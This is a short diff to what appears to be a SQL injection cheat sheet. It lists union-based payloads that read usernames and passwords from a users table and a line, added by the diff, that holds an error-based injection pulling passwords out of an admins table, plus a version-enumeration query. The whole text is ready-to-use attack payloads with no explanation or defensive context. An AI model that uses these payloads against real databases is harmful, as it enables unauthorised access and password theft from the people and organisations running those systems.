@@ -18,6 +18,7 @@
 #### Grab a pw
 `1 or 1 =1 union Select 1, password from users`  
 `1'union select null, concat_ws (char (32,58,32), user, password) from users #`
+`' or (select 1 from (Select count(*),concat((select password from admins),"+",floor(rand()*2))a from information_schema.tables group by a)b)#`
 
 #### Enumerate vesrion:
 `SELECT * FROM v$version`
